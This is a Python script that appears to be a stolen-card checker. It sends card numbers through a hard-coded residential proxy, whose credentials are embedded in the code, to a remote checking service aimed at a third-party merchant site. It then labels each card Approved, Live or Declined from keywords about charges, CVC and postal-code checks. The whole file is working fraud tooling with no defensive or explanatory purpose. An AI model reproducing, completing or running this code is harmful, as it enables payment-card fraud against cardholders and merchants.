import aiohttp
import asyncio
import time

MAX_RETRIES = 2

async def async_auth_func(card: str, proxy: str = None):
    url = "https://kiltes.lol/str/"
    default_proxy = "http://proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
    params = {
        "cc": card,
        "proxy": proxy or default_proxy,
        "site": "https://www.tekkabazzar.com"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "application/json"
    }

    for attempt in range(MAX_RETRIES + 1):
        start = time.perf_counter()
        try:
            timeout = aiohttp.ClientTimeout(total=25)
            async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
                async with session.get(url, params=params) as response:
                    took = time.perf_counter() - start

                    if response.status == 200:
                        try:
                            data = await response.json()
                            msg = data.get("result") or data.get("message") or data.get("error") or str(data)
                        except:
                            msg = await response.text()
                    else:
                        msg = f"HTTP {response.status}"
                        return format_result(card, msg, "Error", took)

        except asyncio.TimeoutError:
            if attempt < MAX_RETRIES:
                await asyncio.sleep(1)  # Backoff
                continue
            return format_result(card, "Request Timeout", "Error", time.perf_counter() - start)
        except Exception as e:
            if attempt < MAX_RETRIES:
                await asyncio.sleep(1)
                continue
            return format_result(card, str(e), "Error", time.perf_counter() - start)

        # Result classification
        msg_lower = msg.lower()
        if any(x in msg_lower for x in ["charged", "thank you for your donation", "payment method added", "successfully charged"]):
            return format_result(card, msg, "Approved", took)
        elif any(x in msg_lower for x in ["insufficient", "incorrect_zip", "zip check", "cvc check", "incorrect_cvc", "postal code mismatch", "avs check", "security code check"]):
            return format_result(card, msg, "Live", took)
        elif any(x in msg_lower for x in ["timeout", "rate limit", "proxy", "request timeout", "connection refused", "service unavailable"]):
            return format_result(card, msg, "Error", took)
        else:
            return format_result(card, msg, "Declined", took)
